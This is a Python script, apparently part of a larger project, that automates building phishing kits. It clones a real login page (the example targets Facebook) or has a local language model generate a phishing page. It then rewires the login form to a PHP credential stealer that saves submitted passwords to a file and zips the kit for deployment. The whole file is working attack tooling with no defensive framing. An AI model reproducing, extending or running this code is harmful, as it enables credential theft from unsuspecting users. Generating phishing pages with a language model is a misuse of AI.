import os
import json
import zipfile
import requests
from datetime import datetime
from bs4 import BeautifulSoup
from utils.logger import logger as log
from llm.offline_chat import get_llm_response

TEMPLATE_DIR = "phishing/templates"
EXPORT_DIR = "phishing/generated_kits"
TRACKER_FILE = "phishing/kit_build_log.json"

def clone_login_page(url, out_dir):
    log(f"Cloning page from {url}")
    response = requests.get(url, headers={'User-Agent': 'Mozilla/5.0'})
    soup = BeautifulSoup(response.text, "html.parser")

    os.makedirs(out_dir, exist_ok=True)
    with open(os.path.join(out_dir, "index.html"), "w", encoding="utf-8") as f:
        f.write(response.text)

    # Download external images/scripts/styles
    for tag in soup.find_all(["img", "script", "link"]):
        src = tag.get("src") or tag.get("href")
        if src and (src.startswith("http://") or src.startswith("https://")):
            try:
                asset = requests.get(src)
                filename = os.path.basename(src)
                with open(os.path.join(out_dir, filename), "wb") as af:
                    af.write(asset.content)
            except:
                continue

def inject_credential_logger(out_dir):
    index_path = os.path.join(out_dir, "index.html")
    with open(index_path, "r+", encoding="utf-8") as f:
        html = f.read()
        soup = BeautifulSoup(html, "html.parser")
        form = soup.find("form")
        if form:
            form["action"] = "stealer.php"
            form["method"] = "POST"
            f.seek(0)
            f.write(str(soup))
            f.truncate()

    with open(os.path.join(out_dir, "stealer.php"), "w") as logger:
        logger.write("<?php file_put_contents('creds.txt', print_r($_POST, true), FILE_APPEND); ?>")

def generate_custom_ai_template(prompt, out_dir):
    response = get_llm_response(f"Design a phishing HTML login page for: {prompt}")
    os.makedirs(out_dir, exist_ok=True)
    with open(os.path.join(out_dir, "index.html"), "w", encoding="utf-8") as f:
        f.write(response)

def zip_kit(out_dir, name):
    zip_path = os.path.join(EXPORT_DIR, f"{name}.zip")
    os.makedirs(EXPORT_DIR, exist_ok=True)
    with zipfile.ZipFile(zip_path, "w") as zipf:
        for root, dirs, files in os.walk(out_dir):
            for file in files:
                zipf.write(os.path.join(root, file), os.path.relpath(os.path.join(root, file), out_dir))
    return zip_path

def log_build(name, url=None):
    entry = {
        "name": name,
        "url": url,
        "timestamp": datetime.utcnow().isoformat()
    }
    if os.path.exists(TRACKER_FILE):
        with open(TRACKER_FILE, "r") as f:
            logs = json.load(f)
    else:
        logs = []

    logs.append(entry)
    with open(TRACKER_FILE, "w") as f:
        json.dump(logs, f, indent=2)

def build_phishing_kit(name, source_url=None, use_ai=False):
    log(f"🚨 Building phishing kit: {name}")
    kit_dir = os.path.join(EXPORT_DIR, name)
    if use_ai:
        generate_custom_ai_template(f"Phishing page template for {name}", kit_dir)
    else:
        if not source_url:
            log("❌ No URL or AI prompt provided.")
            return
        clone_login_page(source_url, kit_dir)

    inject_credential_logger(kit_dir)
    zip_path = zip_kit(kit_dir, name)
    log_build(name, source_url or "AI generated")
    log(f"✅ Kit ready: {zip_path}")

# Example usage:
# build_phishing_kit("fb_clone", "https://facebook.com/login")
# build_phishing_kit("ai_custom_kit", use_ai=True)
